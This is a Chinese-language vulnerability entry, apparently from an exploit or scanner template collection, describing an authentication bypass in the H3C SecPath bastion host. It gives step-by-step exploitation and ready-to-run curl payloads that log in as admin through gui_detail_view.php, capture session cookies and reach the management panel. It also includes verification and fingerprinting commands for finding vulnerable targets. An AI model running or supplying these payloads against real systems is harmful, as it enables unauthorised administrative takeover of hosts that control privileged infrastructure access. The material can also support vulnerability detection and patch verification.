---
id: H3C-SECPATH-LOGIN
title: H3C SecPath 堡垒机 任意用户登录漏洞
product: h3c
vendor: H3C
version_affected: "H3C SecPath 运维审计系统（具体版本未公开）"
severity: CRITICAL
tags: [auth_bypass, 无需认证, 国产]
fingerprint: ["H3C", "SecPath", "堡垒机"]
---

## 漏洞描述

H3C SecPath 运维审计系统（堡垒机）的 `gui_detail_view.php` 接口存在认证绕过漏洞。攻击者通过构造包含 `token`、`id`、`uid` 和 `login` 参数的请求，可绕过正常登录流程，以任意用户（包括管理员）身份登录系统，获取管理后台完整访问权限。

## 影响版本

- H3C SecPath 运维审计系统（受影响版本）

## 前置条件

- 无需认证
- 目标 HTTP 端口（默认 80/443）可访问
- `/audit/gui_detail_view.php` 接口可达

## 利用步骤

1. 确认目标为 H3C SecPath 运维审计系统
2. 构造请求访问 `gui_detail_view.php`，设置 `login=admin` 参数
3. 系统返回管理员会话，获取管理后台访问权限
4. 利用管理员权限执行后续操作

## Payload

### 以 admin 身份登录

```bash
curl "http://target/audit/gui_detail_view.php?token=1&id=10&uid=1&login=admin"
```

### 获取完整响应（含 Cookie）

```bash
curl -v "http://target/audit/gui_detail_view.php?token=1&id=10&uid=1&login=admin" 2>&1
```

### 使用获取的 Cookie 访问管理后台

```bash
# 先获取会话 Cookie
curl -c cookies.txt "http://target/audit/gui_detail_view.php?token=1&id=10&uid=1&login=admin"

# 使用 Cookie 访问管理面板
curl -b cookies.txt "http://target/audit/index.php"
```

## 验证方法

```bash
# 检查响应是否包含管理后台内容
curl -s "http://target/audit/gui_detail_view.php?token=1&id=10&uid=1&login=admin" | grep -i "admin\|管理\|dashboard\|控制台"

# 检查是否返回有效会话（非登录页面重定向）
curl -s -o /dev/null -w "%{http_code}" "http://target/audit/gui_detail_view.php?token=1&id=10&uid=1&login=admin"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "H3C\|SecPath\|堡垒机\|运维审计"
curl -s -o /dev/null -w "%{http_code}" "http://target/audit/gui_detail_view.php"
```
